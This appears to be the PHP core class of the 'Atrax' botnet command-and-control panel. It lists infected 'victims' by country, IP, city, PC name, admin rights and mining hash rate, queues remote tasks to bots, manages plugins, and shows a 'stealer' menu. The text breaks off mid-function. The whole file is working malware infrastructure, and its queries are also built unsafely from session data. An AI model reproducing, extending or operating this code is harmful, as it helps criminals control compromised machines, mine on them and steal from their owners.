<?php

  /*
   *  @author /-_-\
   *  @project Atrax
   */

  require_once('objects.class.php');

  Class Core extends Objects {
      public $Objects;

      /*
       * Constructor
       */

      public function __construct() {
          $this->Objects = new Objects;
          $this->Password = PASSWORD;

          //Quick stats
          $this->setQuickStatistics();

          //Date Time
          $this->setDateTime();

          //Navigation
          $this->setNavigation();
      }

      /*
       * Statistics
       */

      public function getStatistics() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $tpl_stats = new Template('statistics/stats.tpl');
          $tpl_cstatsrows = new Template('statistics/cstatsrows.tpl');
          $tpl_osrows = new Template('statistics/osrows.tpl');
          $tpl_infectionsrows = new Template('statistics/infectionsrows.tpl');

          //Countries (Top 10)
          $result = '';
          $i = 0;

          $this->Objects->MySQL->doQuery('SELECT Country, count(Country), CountryLong FROM victims GROUP BY Country ORDER BY count(Country) DESC LIMIT 0, 10');
          while($victims = $this->Objects->MySQL->arrayResult()) {
              foreach($victims as $key => $value) {  $victims[$key] = $this->convertString($victims[$key]); }

              $tpl_cstatsrows->set('Country', strtolower($victims['Country']));
              $tpl_cstatsrows->set('CountryLong', $victims['CountryLong']);
              $tpl_cstatsrows->set('Number', $victims[1]);

              if($i % 2) { $tpl_cstatsrows->set('class', 'alt'); } else { $tpl_cstatsrows->set('class', ''); }

              $result .= $tpl_cstatsrows->result();
              $i++;
          }

          $tpl_stats->set('Countries', $result);

          //Operating systems
          $result = '';
          $i = 0;

          $this->Objects->MySQL->doQuery('SELECT OS, osname, osversion, count(OS) FROM victims INNER JOIN operating_system ON OS = osId GROUP BY OS ORDER BY count(OS) DESC');
          while($victims = $this->Objects->MySQL->arrayResult()) {
              foreach($victims as $key => $value) {  $victims[$key] = $this->convertString($victims[$key]); }

              $tpl_osrows->set('OS', $victims['osname'].' '.$victims['osversion']);
              $tpl_osrows->set('Number', $victims[3]);

              if($i % 2) { $tpl_osrows->set('class', 'alt'); } else { $tpl_osrows->set('class', ''); }

              $result .= $tpl_osrows->result();
              $i++;
          }

          $tpl_stats->set('OS', $result);

          //Last infections
          $result = '';
          $i = 0;

          $this->Objects->MySQL->doQuery('SELECT * FROM victims ORDER BY creationDate DESC LIMIT 0, 10');
          while($victims = $this->Objects->MySQL->arrayResult()) {
              foreach($victims as $key => $value) {  $victims[$key] = $this->convertString($victims[$key]); }

              $tpl_infectionsrows->set('Country', $victims['Country']);
              $tpl_infectionsrows->set('CountryLong', $victims['CountryLong']);
              $tpl_infectionsrows->set('City', $victims['City']);
              $tpl_infectionsrows->set('Date', date('d.m.Y H:i', $victims['Connected']));

              if($i % 2) { $tpl_infectionsrows->set('class', 'alt'); } else { $tpl_infectionsrows->set('class', ''); }

              $result .= $tpl_infectionsrows->result();
              $i++;
          }

          $tpl_stats->set('LastInfections', $result);

          return $this->setOutput($tpl_stats->result(), 'Statistics');
      }

      /*
       * Plugin Statistic
       */

      public function getPluginStatistic() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $tpl_pluginstats = new Template('statistics/pluginstats.tpl');
          $tpl_pluginstatsrows = new Template('statistics/pluginstatsrows.tpl');

          //Last 10 Installations
          $result = '';
          $i = 0;

          $this->Objects->MySQL->doQuery('SELECT Plugin, GUID, HEX(GUID) as GUIDString FROM plugins ORDER BY ID DESC LIMIT 0, 10');
          while($plugins = $this->Objects->MySQL->arrayResult()) {
              foreach($plugins as $key => $value) {  $plugins[$key] = $this->convertString($plugins[$key]); }

              $tpl_pluginstatsrows->set('Plugin', $plugins['GUIDString']);
              $tpl_pluginstatsrows->set('Amount', $plugins['Plugin']);

              if($i % 2) { $tpl_pluginstatsrows->set('class', 'alt'); } else { $tpl_pluginstatsrows->set('class', ''); }

              $result .= $tpl_pluginstatsrows->result();
              $i++;
          }

          $tpl_pluginstats->set('LastInstallations', $result);

          //Top 10 Installations
          $result = '';
          $i = 0;

          $this->Objects->MySQL->doQuery('SELECT Plugin, count(Plugin) FROM plugins GROUP BY Plugin ORDER BY count(Plugin) DESC LIMIT 0, 10');
          while($plugins = $this->Objects->MySQL->arrayResult()) {
              foreach($plugins as $key => $value) {  $plugins[$key] = $this->convertString($plugins[$key]); }

              $tpl_pluginstatsrows->set('Plugin', $plugins['Plugin']);
              $tpl_pluginstatsrows->set('Amount', $plugins[1]);
              $tpl_pluginstatsrows->set('Style', 'text-align: center;');

              if($i % 2) { $tpl_pluginstatsrows->set('class', 'alt'); } else { $tpl_pluginstatsrows->set('class', ''); }

              $result .= $tpl_pluginstatsrows->result();
              $i++;
          }

          $tpl_pluginstats->set('Top10Plugins', $result);

          return $this->setOutput($tpl_pluginstats->result(), 'Plugin statistic');
      }

      /*
       * Show Tasks
       */

      public function getTasks() {
          if(!$this->isAdmin()) { return $this->getLogin(); }
          
          $tpl_tasks = new Template('tasks/tasks.tpl');
          $tpl_tasksrows = new Template('tasks/tasksrows.tpl');

          $result = '';

          $this->Objects->MySQL->doQuery('SELECT * FROM tasks WHERE SpecGUID = \'\'');
          while($task = $this->Objects->MySQL->arrayResult()) {
              foreach($task as $key => $value) {  $task[$key] = $this->convertString($task[$key]); }

              $Count = $task['Count'] == '0' ? 'Unlim.' : $task['Count'];

              $tpl_tasksrows->set('ID', $task['ID']);
              $tpl_tasksrows->set('Command', $this->ectractFullName($task['Command']));
              $tpl_tasksrows->set('Parameter', $task['Parameter']);
              $tpl_tasksrows->set('Countries', $this->parseCountries($task['Countries']));
              $tpl_tasksrows->set('Count', $Count);
              $tpl_tasksrows->set('Start', $this->isOverTime($task['Start']));
              $tpl_tasksrows->set('Stop', $this->isOverTime($task['Stop']));
              $tpl_tasksrows->set('Received', $task['Received']);
              $tpl_tasksrows->set('Executed', $task['Executed']);
              $tpl_tasksrows->set('Fails', $task['Fails']);

              if($task['Stop'] <= time() && $task['Start'] !== '0') {
                  $tpl_tasksrows->set('class', 'offline');
              } else {
                  if($task['Stop'] == '0' && $task['Start'] == '0' && $task['Executed'] >= $Count) {
                      $tpl_tasksrows->set('class', 'offline');
                  } else {
                      $tpl_tasksrows->set('class', 'free');
                  }
              }

              $result .= $tpl_tasksrows->result();
          }

          $tpl_tasks->set('tasks', $result);

          return $this->setOutput($tpl_tasks->result(), 'Tasks');
      }

      /*
       * Show Settings
       */

      public function getSettings() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $tpl_settings = new Template('settings/settings.tpl');
          $tpl_settingssrows = new Template('settings/settingsrows.tpl');
          $tpl_settingssrowsfile = new Template('settings/settingsrowsfile.tpl');

          $result = '';
          $i = 0;

          $this->Objects->MySQL->doQuery('SELECT * FROM settings');
          while($setting = $this->Objects->MySQL->arrayResult()) {
              foreach($setting as $key => $value) {  $setting[$key] = $this->convertString($setting[$key]); }

              $tpl_settingssrows->set('Name', $setting['Name']);
              $tpl_settingssrows->set('Parameters', $setting['Parameters']);
              $tpl_settingssrows->set('ID', $setting['ID']);

              if($i % 2) { $tpl_settingssrows->set('class', 'alt'); } else { $tpl_settingssrows->set('class', ''); }

              $result .= $tpl_settingssrows->result();
              $i++;
          }

          $tpl_settings->set('SettingsInstalled', $result);

          //Read folder
          $result = '';
          $i = 0;
          $handle = opendir('settings');
		  
		  if ($handle == FALSE)
		  {
		    die ('Cannot open settings folder. Please check your webserver/php settings.<br/>DOCUMENT_ROOT: ' . $_SERVER['DOCUMENT_ROOT'] . '<br/>File Root: '. dirname(__FILE__));
		  }
          while ($file = readdir ($handle)) {
              $file = $this->convertString($file);
              if(pathinfo($file, PATHINFO_EXTENSION) == 'lip') {
                  $this->Objects->MySQL->doQuery('SELECT * FROM settings WHERE File = \''.$this->Objects->MySQL->escapeString(pathinfo($file, PATHINFO_FILENAME)).'\'');
                  if(!$this->Objects->MySQL->numResult()) {
                      $tpl_settingssrowsfile->set('Name', pathinfo($file, PATHINFO_FILENAME));
                      if($i % 2) { $tpl_settingssrowsfile->set('class', 'alt'); } else { $tpl_settingssrowsfile->set('class', ''); }
                      $result .= $tpl_settingssrowsfile->result();
                      $i++;
                  }
              }
          }
          closedir($handle);

          $tpl_settings->set('SettingsAvailable', $result);
          $tpl_settings->set('Inactive', $this->getNumberOfInactiveBots());

          $csrf = md5(uniqid(rand(), TRUE));
          $_SESSION['csrf'] = $csrf;
          $tpl_settings->set('CSRF', $csrf);

          return $this->setOutput($tpl_settings->result(), 'Settings');
      }

      /*
       * Install Settings
       */

      public function installSetting($setting) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $setting = $this->convertString($setting);
          $tpl_setting = new Template('settings/setting.tpl');

          if(isset($_POST['submit'])) {
              $data = array('name' => $_POST['pname'], 'type' => $_POST['ptype'], 'params' => $_POST['pparams'], 'file' => $_POST['pfname']);
              foreach($data as $key => $value) { if(empty($data[$key])) { $error = 'Error: Empty field(s) found'; break; } $data[$key] = $this->Objects->MySQL->escapeString($data[$key]); }

              if(empty($error)) {
                  if(file_exists('settings/'.$data['file'].'.lip')) {
                      $this->Objects->MySQL->doQuery('SELECT * FROM settings WHERE name =  \''.$data['name'].'\'');

                      if(!$this->Objects->MySQL->numResult()) {
                          $this->Objects->MySQL->doQuery('INSERT INTO `settings` (`File`, `Name`, `Parameters`, `Single`) VALUES (\''.$data['file'].'\', \''.$data['name'].'\', \''.$data['params'].'\', \''.$data['type'].'\')');

                          header('Location: index.php?action=settings');
                      } else {
                          $tpl_setting->set('notification', 'Setting already exists');
                      }
                  }
              } else {
                  $tpl_setting->set('notification', $error);
              }
          } else {
              if(file_exists('settings/'.$setting.'.lip') && is_readable('settings/'.$setting.'.lip')) {
                  $filehandle = fopen('settings/'.$setting.'.lip', 'r');
                  $line = fgets($filehandle, 4096);

                  if(!empty($line) && strpos($line, '|')) {
                      $teile = explode('|', $line);

                      if(!empty($teile[0]) && !empty($teile[1]) && !empty($teile[2])) {
                          $name = $this->convertString($teile[0]);
                          $type = $this->convertString($teile[1]);
                          $parameters = $this->convertString($teile[2]);

                          if(!empty($name) && !empty($type) && !empty($parameters)) {
                              $tpl_setting->set('Name', $name);
                              $tpl_setting->set('Type', $type);
                              $tpl_setting->set('Parameters', $parameters);
                              $tpl_setting->set('Pfname', $setting);
                          }
                      } else {
                          $tpl_setting->set('notification', 'Invalid format - Setting invalid');
                      }
                  } else {
                      $tpl_setting->set('notification', 'Invalid format - Setting invalid');
                  }
              } else {
                  $tpl_setting->set('notification', 'Setting doesn\'t exist or not readable');
              }
          }

          return $this->setOutput($tpl_setting->result(), 'Install setting');
      }

      /*
       * Deinstall setting
       */

      public function deinstallSetting($id) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $this->Objects->MySQL->doQuery('DELETE FROM settings WHERE ID = \''.$this->Objects->MySQL->escapeString((int)$id).'\'');
          header('Location: index.php?action=settings');
      }

      /*
       * Add new Task
       */

      public function setTask() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $tpl_addtask = new Template('tasks/addtask.tpl');
          $tpl_settings = new Template('settings/settingsselect.tpl');

          //Read settings
          $result = '';

          $this->Objects->MySQL->doQuery('SELECT * FROM settings');

          if($this->Objects->MySQL->numResult()) {
              while($setting = $this->Objects->MySQL->arrayResult()) {
                  foreach($setting as $key => $value) { $setting[$key] = $this->convertString($setting[$key]); }

                  $tpl_settings->set('ID', $setting['ID']);
                  $tpl_settings->set('Setting', $setting['Name']);

                  $result .= $tpl_settings->result();
              }
          }

          $tpl_addtask->set('Settings', $result);

          //Validate POST Data
          if(isset($_POST['submit'])) {
              $this->Objects->MySQL->doQuery('SELECT * FROM settings WHERE ID = \''.$this->Objects->MySQL->escapeString((int)$_POST['setting']).'\'');

              if($this->Objects->MySQL->numResult()) {
                  $settingsselected = $this->Objects->MySQL->arrayResult();
                  $tpl_addtasknext = new Template('tasks/addtasknext.tpl');
                  $tpl_countries = new Template('tasks/countries.tpl');

                  //Countries Top 10
                  $result = '';

                  $this->Objects->MySQL->doQuery('SELECT Country, count(Country), CountryLong FROM victims GROUP BY Country ORDER BY count(Country) DESC LIMIT 0, 5');
                  while($victims = $this->Objects->MySQL->arrayResult()) {
                      foreach($victims as $key => $value) {  $victims[$key] = $this->convertString($victims[$key]); }

                      $tpl_countries->set('Country', strtolower($victims['Country']));
                      $tpl_countries->set('CountryLong', $victims['CountryLong']);

                      $result .= $tpl_countries->result();
                  }

                  $tpl_addtasknext->set('Countries', $result);
                  $tpl_addtasknext->set('Name', $settingsselected['File']);
                  $tpl_addtasknext->set('SettingsSettings', $this->parseParameters($this->removeBadChars($settingsselected['Parameters'])));

                  if($settingsselected['Single'] !== 'single') {
                      $tpl_overtime = new Template('tasks/overtime.tpl');
                      $tpl_overtime->set('date', date('Y-m-d H:i:s'));
                      $tpl_addtasknext->set('Overtime', $tpl_overtime->result());
                  }

                  return $this->setOutput($tpl_addtasknext->result(), 'Add task');
              }
          } else if(isset($_POST['add'])) {
              $data = array('setting' => $_POST['setting']);
              foreach($data as $key => $value) { if(empty($data[$key])) { $error = 'Error: Empty field(s) found'; break; } $data[$key] = $this->Objects->MySQL->escapeString($data[$key]); }

              //Optional
              if(isset($_POST['overtime']) && $_POST['overtime'] == 'yes' && empty($error)) {
                  //Date Time YES
                  $datestart = strtotime($_POST['start']);
                  $datestop = strtotime($_POST['stop']);

                  if($datestop <= $datestart) {
                      $error = 'Error: Start and stop time are the same or invalid';
                  }
              }

              //Read setting fields
              $param = '';
			  //die(print_r($_POST));

              $this->Objects->MySQL->doQuery('SELECT * FROM settings WHERE File = \''.$this->Objects->MySQL->escapeString($data['setting']).'\'');
              if($this->Objects->MySQL->numResult()) {
                  $fields = $this->Objects->MySQL->arrayResult();

				  if (strlen($fields['Parameters']) > 4)
				  {
                  $teile = explode('#', $this->removeBadChars($fields['Parameters']));
                  for ($i = 0; $i < count($teile); $i++) {
                      if(!empty($teile[$i])) {
                          if(isset($_POST[$teile[$i]]) && !empty($_POST[$teile[$i]])) {
                              $param .= $this->Objects->MySQL->escapeString($_POST[$teile[$i]]).'#';
                          } else {
                              $error = 'Error: Empty field(s) found -> ' . $teile[$i] . ' ' . print_r($_POST);
                              break;
                          }
                      }
                  }
				  }
                  $param = substr($param, 0, -1);
              }

              $countries = !empty($_POST['countries']) ? $this->Objects->MySQL->escapeString($_POST['countries']) : '';

              if(empty($error)) {
                  if(isset($_POST['overtime']) && $_POST['overtime'] == 'yes') {
                      $this->Objects->MySQL->doQuery('INSERT INTO `tasks` (`Countries`, `Command`, `Parameter`, `Count`, `Start`, `Stop`) VALUES (\''.$countries.'\', \''.$data['setting'].'\', \''.$param.'\', \''.$this->Objects->MySQL->escapeString($_POST['count']).'\', \''.$this->Objects->MySQL->escapeString($datestart).'\', \''.$this->Objects->MySQL->escapeString($datestop).'\')');
                  } else {
                      $this->Objects->MySQL->doQuery('INSERT INTO `tasks` (`Countries`, `Command`, `Parameter`, `Count`) VALUES (\''.$countries.'\', \''.$data['setting'].'\', \''.$param.'\', \''.$this->Objects->MySQL->escapeString($_POST['count']).'\')');
                  }

                  $tpl_addtask->set('notification', 'Successfully added');
              } else {
                  $tpl_addtask->set('notification', $error);
              }
          }

          return $this->setOutput($tpl_addtask->result(), 'Add task');
      }

      /*
       * Delete finished Tasks
       */

      public function deleteFinishedTasks() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $content = '';
		  $timeSaving = time();
          $this->Objects->MySQL->doQuery('SELECT ID FROM tasks WHERE Stop <= \''. $timeSaving .'\' AND Stop <> 0');
		  
		  $number1 = $this->Objects->MySQL->numResult();
		  while($guids = $this->Objects->MySQL->arrayResult())
		  {
			$this->Objects->MySQL->doQuery('DELETE FROM tasks_victims WHERE TaskId = \'' . $guids['ID'] . '\'');
		  }
         
          $this->Objects->MySQL->doQuery('SELECT ID FROM tasks WHERE Stop = 0 AND Count = Received');
          $number2 = $this->Objects->MySQL->numResult();
		  while($guids = $this->Objects->MySQL->arrayResult())
		  {
			$this->Objects->MySQL->doQuery('DELETE FROM tasks_victims WHERE TaskId = \'' . $guids['ID'] . '\'');
		  }
		  
          $number = $number1+$number2;

          if($number > 0) {
              $this->Objects->MySQL->doQuery('DELETE FROM tasks WHERE Stop <= \''. $timeSaving .'\' AND Stop <> 0');
              $this->Objects->MySQL->doQuery('DELETE FROM tasks WHERE Stop = 0 AND Count = Received');
              $content = $number.' Tasks successfully deleted';
          } else {
              $content = 'No task is ready for deleting';
          }

          $content = empty($content) ? 'Unknown error' : $content;

          return $this->setOutput($content, 'Finished Tasks');
      }

      /*
       * Get Tasks Logs
       */

      public function getTaskLog($id) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $tpl_tasklog = new Template('tasks/tasklog.tpl');
          $tpl_tasklogrows = new Template('tasks/tasklogrows.tpl');

          $result = '';
          $i2 = 0;
          $success = 0;
          $failed = 0;
		  $waiting = 0;
		  
          //$this->Objects->MySQL->doQuery('SELECT GUIDs FROM tasks WHERE ID = \''.$this->Objects->MySQL->escapeString((int)$id).'\'');
		  $this->Objects->MySQL->doQuery('SELECT HEX(GUID) as GUIDString, success, executed, failed FROM tasks_victims WHERE TaskId = \''.$this->Objects->MySQL->escapeString((int)$id).'\'');
          while($guids = $this->Objects->MySQL->arrayResult())
		  {
		  
			$tpl_tasklogrows->set('GUID', $guids['GUIDString']);
		    if (intval($guids['executed']) == 0)
			{
				$waiting++;
				$tpl_tasklogrows->set('Status', 'wait');
			}
			else if (intval($guids['success']) == 1)
			{
				$success++;
				$tpl_tasklogrows->set('Status', 'success');
			}
			else
			{
				$failed++;
				$tpl_tasklogrows->set('Status', 'error');
			}
			$result .= $tpl_tasklogrows->result();
			if($i2 % 2) { $tpl_tasklogrows->set('class', 'alt'); } else { $tpl_tasklogrows->set('class', ''); }
			$i2++;
		  }

          $tpl_tasklog->set('All', $success + $failed + $waiting);
          $tpl_tasklog->set('Success', $success);
          $tpl_tasklog->set('Failed', $failed);
          $tpl_tasklog->set('Logs', $result);

          return $tpl_tasklog->result();
      }

      /*
       * Force delete
       */

      public function deleteTask($id) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

		  $taskId = $this->Objects->MySQL->escapeString((int)$id);
          $this->Objects->MySQL->doQuery('DELETE FROM tasks WHERE ID = \''. $taskId .'\'');
		  $this->Objects->MySQL->doQuery('DELETE FROM tasks_victims WHERE TaskId = \''. $taskId .'\'');
          header('Location: index.php?action=tasks');
      }


      /*
       * Edit Task
       */

      public function editTask($id) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          if(isset($_POST['submit'])) {
              $data = array('id' => $_POST['id'], 'command' => $_POST['command'], 'parameter' => $_POST['parameter'], 'count' => $_POST['count']);
              foreach($data as $key => $value) { if(empty($data[$key])) { $error = 'Error: Empty field(s) found'; break; } $data[$key] = $this->Objects->MySQL->escapeString($data[$key]); }

              if(empty($error)) {
                  $start = '0'; $stop = '0';

                  if($_POST['start'] !== '-') {
                      $start = $this->Objects->MySQL->escapeString(strtotime($_POST['start']));
                      $stop = $this->Objects->MySQL->escapeString(strtotime($_POST['stop']));
                  }

                  if(!is_numeric($data['count'])) {
                      $data['count'] = '0';
                  }

                  $this->Objects->MySQL->doQuery('UPDATE tasks Set Countries = \''.$this->Objects->MySQL->escapeString($_POST['countries']).'\', Command = \''.$data['command'].'\', Parameter = \''.$data['parameter'].'\', Start = \''.$start.'\', Stop = \''.$stop.'\', Count = \''.$data['count'].'\' WHERE ID = \''.$data['id'].'\'');
                  header('Location: index.php?action=tasks');
              } else {
                  $this->setOutput($error, 'Error');
              }
          }

          $this->Objects->MySQL->doQuery('SELECT * FROM tasks WHERE ID = \''.$this->Objects->MySQL->escapeString((int)$id).'\'');

          if($this->Objects->MySQL->numResult()) {
              $task = $this->Objects->MySQL->arrayResult();
              foreach($task as $key => $value) { $task[$key] = $this->convertString($task[$key]); }

              $tpl_edittask = new Template('tasks/edittask.tpl');
              $tpl_edittask->set('ID', $task['ID']);
              $tpl_edittask->set('Countries', $task['Countries']);
              $tpl_edittask->set('Command', $task['Command']);
              $tpl_edittask->set('Parameter', $task['Parameter']);

              if($task['Start'] !== '0') {
                  $tpl_edittask->set('Start', $this->isOverTime($task['Start']));
                  $tpl_edittask->set('Stop', $this->isOverTime($task['Stop']));
              } else {
                  $tpl_edittask->set('Start', '-');
                  $tpl_edittask->set('Stop', '-');
                  $tpl_edittask->set('Disabled', 'disabled');
              }

              if($task['Count'] == '0') {
                  $tpl_edittask->set('Count', 'Unlimited');
              } else {
                  $tpl_edittask->set('Count', $task['Count']);
              }

              return $this->setOutput($tpl_edittask->result(), 'Edit task');
          } else {
              header('Location: index.php?action=tasks');
          }
      }

      /*
       * Show Plugins
       */

      public function getPlugins() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

       	  $tpl_plugins = new Template('plugins/plugins.tpl');
          $tpl_pluginsrows = new Template('plugins/pluginsrows.tpl');

       	  $handle = opendir('plugins');
       	  $result = '';
          $result2 = '';
          $i = 0;

       	  while ($file = readdir($handle)) {
       	    if(!is_dir($file) && file_exists('plugins/'.$file.'/info.php')) {
       		  require_once('plugins/'.$file.'/info.php');

              $tpl_pluginsrows->set('Folder', $this->convertString($file));
              $tpl_pluginsrows->set('Name', $this->convertString($PLUGIN_NAME));
              $tpl_pluginsrows->set('Author', $this->convertString($PLUGIN_AUTHOR));
              $tpl_pluginsrows->set('Description', $this->convertString($PLUGIN_DESCRIPTION));
              $tpl_pluginsrows->set('Version', $this->convertString($PLUGIN_VERSION));

              if($i % 2) { $tpl_pluginsrows->set('class', 'alt'); } else { $tpl_pluginsrows->set('class', ''); }

       		  if($this->Objects->Plugin->isPluginInstalled($file)) {
                $tpl_pluginsrows->set('Install', 'Deinstall');
                $tpl_pluginsrows->set('Logo', 'delete');
                $result .= $tpl_pluginsrows->result();
       		  } else {
                $tpl_pluginsrows->set('Install', 'Install');
                $tpl_pluginsrows->set('Logo', 'add');
                $result2 .= $tpl_pluginsrows->result();
              }

              $i++;
       		}
       	  }

          $tpl_plugins->set('InstalledPlugins', $result);
          $tpl_plugins->set('AvailablePlugins', $result2);

       	  closedir($handle);

       	  return $this->setOutput($tpl_plugins->result(), 'Plugins');
      }

      /*
       * DeInstall Plugin
       */

      public function DeInstallPlugin($plugin) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $this->Objects->Plugin->DeInstallPlugin($plugin);
          header('Location: index.php?action=plugins');
      }

      /*
       * Run Plugin
       */

      public function runPlugin($plugin) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          return $this->setOutput($this->Objects->Plugin->runPlugin($plugin), 'Run plugin "'.$this->convertString($plugin).'"');
      }

      /*
       * Show Plugins
       */

      public function updatePlugin($plugin) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          return $this->setOutput($this->Objects->Plugin->updatePlugin($plugin), 'Update plugin "'.$this->convertString($plugin).'"');
      }

      /*
       * Show Bots
       */

      public function getBots() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $extendedList = false; $ext = '';
          $offline = false; $off = '';

          if(isset($_GET['offline'])) {
              $offline = true;
              $off = 'offline&';
          }
          if(isset($_GET['extended'])) {
              $extendedList = true;
              $ext = 'extended&';
          }

          //PNavi
          $minus = '';
          $perpage = (int)PERPAGE;

          if(isset($_GET['site'])) {
              $start_now = $this->convertString((int)$_GET['site']);

              if($start_now == '0') {
                  $minus = '';
              }else if($start_now == $perpage) {
                  $minus = '<a href="?action=bots&'.$off.$ext.'site='.($start_now - $perpage).'">'.($start_now - $perpage).'</a> ';
              } else {
                  $minus = '<a href="?action=bots&'.$off.$ext.'site='.($start_now - $perpage).'">'.($start_now - $perpage).' - '.($start_now).'</a> ';
              }
          } else {
              $start_now = 0;
          }
          //PNavi

          if ($extendedList) {
              $tpl_bots = new Template('bots/botsExt.tpl');
              $tpl_botssrows = new Template('bots/botsrowsExt.tpl');
          } else {
              $tpl_bots = new Template('bots/bots.tpl');
              $tpl_botssrows = new Template('bots/botsrows.tpl');
          }

          if(isset($_GET['extended']))
              $navigationMainExtendedButton = preg_replace('/&extended/', '', $_SERVER['REQUEST_URI']);
          else
              $navigationMainExtendedButton = $_SERVER['REQUEST_URI'].'&extended';
          
          if(isset($_GET['offline'])) {
              $tpl_bots->set('offlineShowHide', 'Hide');
              $navigationMainOfflineButton = preg_replace('/&offline/', '', $_SERVER['REQUEST_URI']);
          } else {
              $tpl_bots->set('offlineShowHide', 'Show');
              $navigationMainOfflineButton = $_SERVER['REQUEST_URI'].'&offline';
          }

          $tpl_bots->set('navigationMainOfflineButton', $navigationMainOfflineButton);
          $tpl_bots->set('navigationMainExtendedButton', $navigationMainExtendedButton);

          $filtermenu = '';
          $this->Objects->MySQL->doQuery('SELECT * FROM `victims` GROUP BY `Country`');
          $options = '<option value="0"><i>Please select...</i></option>';
          while( $t = $this->Objects->MySQL->arrayResult() ) {
              $saved = isset($_SESSION['bots_select']) ? $_SESSION['bots_select'] : 0;
              $selected = ( $t['Country'] === $saved ) ? ' selected' : '';
              $options .= '<option value="'.$t['Country'].'"'.$selected.'>'.$t['CountryLong'].'</option>';
          }
          $filtermenu .= '<select name="bots_select" style="width: 20%; margin-right: 10px; padding: 5px;">'.$options.'</select>';
          $filtermenu .= '<input type="text" name="bots_filter" style="width: 50%; padding: 6px; margin-right: 10px;" value="'.(isset($_SESSION['bots_filter']) ? $_SESSION['bots_filter'] : '').'" />';
          $filtermenu .= '<input class="btnyellow" type="submit" name="bots_filter_submit" value="Filter Bots" />  ';
          $filtermenu .= '<input class="btnyellow" type="submit" name="bots_filter_reset" value="Reset Filter" />';

          $tpl_bots->set('filterForm', $filtermenu);


          $result = '';

          if($offline) {
              $this->Objects->MySQL->doQuery('SELECT Free,Country,CountryLong,IP,BuildID,Region, City, PCName, osname, osversion,Admin, CPUName, GPUName,HashRate,creationDate,Online, HEX(GUID) as GUIDString FROM victims INNER JOIN operating_system ON OS = osId '.(isset($_SESSION['bots_query']) ? $_SESSION['bots_query'] : '').' LIMIT '.$this->Objects->MySQL->escapeString($start_now).', '.$perpage.'');
          } else {
			if (isset($_SESSION['bots_query'])) { //TODO hier richtig machen
			//Fehler: SELECT * FROM victims INNER JOIN operating_system ON OS = osId WHERE WHERE `Country` = 'de' AND Online = '1' LIMIT 0, 20
				if (strstr($_SESSION['bots_query'], 'WHERE ') != FALSE) {
					$ohneWhereFix = substr($_SESSION['bots_query'], 6);
				}
				else
				{
					$ohneWhereFix = $_SESSION['bots_query'];
				}
				
			}
              $this->Objects->MySQL->doQuery('SELECT Free,Country,CountryLong,IP,BuildID,Region, City, PCName, osname, osversion,Admin, CPUName, GPUName,HashRate,creationDate,Online, HEX(GUID) as GUIDString FROM victims INNER JOIN operating_system ON OS = osId WHERE '.(isset($_SESSION['bots_query']) ? ($ohneWhereFix.' AND ') : '').'Online = \'1\' LIMIT '.$this->Objects->MySQL->escapeString($start_now).', '.$perpage.'');
          }

          while($victim = $this->Objects->MySQL->arrayResult()) {
              foreach($victim as $key => $value) { $victim[$key] = $this->convertString($victim[$key]); }

              $tpl_botssrows->set('viewlink', $_SERVER['REQUEST_URI'].'&view='.$victim['GUIDString']);

              $tpl_botssrows->set('Country', strtolower($victim['Country']));
              $tpl_botssrows->set('CountryLong', $victim['CountryLong']);
              $tpl_botssrows->set('IP', $victim['IP']);

              if ($extendedList) {
                  $tpl_botssrows->set('GUID', $victim['GUIDString']);
              } else {
                  $tpl_botssrows->set('GUID', substr($victim['GUIDString'],0 ,6));
              }


              $tpl_botssrows->set('BuildID', $victim['BuildID']);
              $tpl_botssrows->set('Region', $victim['Region']);
              $tpl_botssrows->set('City', $victim['City']);
              $tpl_botssrows->set('PCName', $victim['PCName']);
              $tpl_botssrows->set('WIN', $this->getOSIcon($victim['osname']));
              $tpl_botssrows->set('OS', $victim['osname'].' '.$victim['osversion'].$this->isBotAdmin($victim['Admin']));
              if ($extendedList) {
                  $tpl_botssrows->set('CPU', $victim['CPUName']);
                  $tpl_botssrows->set('GPU', $victim['GPUName']);
                  $tpl_botssrows->set('HASHSPEED', $victim['HashRate']);
                  $tpl_botssrows->set('Created', $victim['creationDate']);
              }


              if($offline && $victim['Online'] == '0') {
                  $tpl_botssrows->set('class', 'offline');
              } else {
                  if($victim['Free'] == '1') {
                      $tpl_botssrows->set('class', 'free');
                  } else {
                      $tpl_botssrows->set('class', 'notfree');
                  }
              }

              $result .= $tpl_botssrows->result();
          }

          $tpl_bots->set('bots', $result);

          //PNavi
          if($off) {
              $this->Objects->MySQL->doQuery('SELECT GUID FROM victims');
          } else {
              $this->Objects->MySQL->doQuery('SELECT GUID FROM victims WHERE online = \'1\'');
          }

          $plus = $this->Objects->MySQL->numResult();

          if($plus > $start_now+$perpage) {
              $plus = '<a href="?action=bots&'.$off.$ext.'site='.($start_now + $perpage).'">'.($start_now + $perpage).' - '.($start_now + ($perpage*2)).'</a>';
          } else {
              $plus = '';
          }

          $tpl_bots->set('PageNavigation', $minus.$plus);
          //PNavi

          return $this->setOutput($tpl_bots->result(), 'Bots');
      }


      /*
       * Show Bot Details
       */

      public function getBotInfo( $guid ) {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $menu = '<div class="stealer_menu">';
          $menu .= '<span class="buttons" style="float:right;">';
          $menu .= '<a href="'.preg_replace('/&view=[a-zA-Z0-9]*/', '', $_SERVER['REQUEST_URI']).'" style="text-decoration: none;"><button class="btnnormal">Back to Overview</button></a>';
          $menu .= '</span>';
          $menu .= '</div>';
          $menu .= '<div style="clear: both;"></div>';

          $content = $menu;

